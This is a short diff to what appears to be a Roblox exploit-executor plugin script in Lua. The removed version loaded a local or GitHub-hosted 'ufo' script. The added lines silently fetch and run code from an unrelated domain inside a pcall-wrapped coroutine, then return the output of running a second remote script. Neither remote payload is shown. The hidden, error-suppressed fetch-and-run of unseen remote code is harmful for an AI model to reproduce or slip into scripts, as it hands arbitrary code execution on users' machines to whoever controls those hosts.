@@ -1,1 +1,4 @@
-local filesaved=isfile('ufo-noided.lua') local plug if filesaved then local dofile=dofile or function(...) loadfile(...)() end plug={['ufo']={['func']=dofile,['onlypass']=true,['args']='ufo-noided.lua'}} else plug={['ufo']={['func']=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/6yNuiC9/scr/main/ufo-noided.lua"))() end}} end plug.ufo.desc='requires the UFO hat (8151404994)' filesaved=nil return plug
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
+end)
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/6yNuiC9/scr/newuserdplugins/ufucko.lua", true))(...)
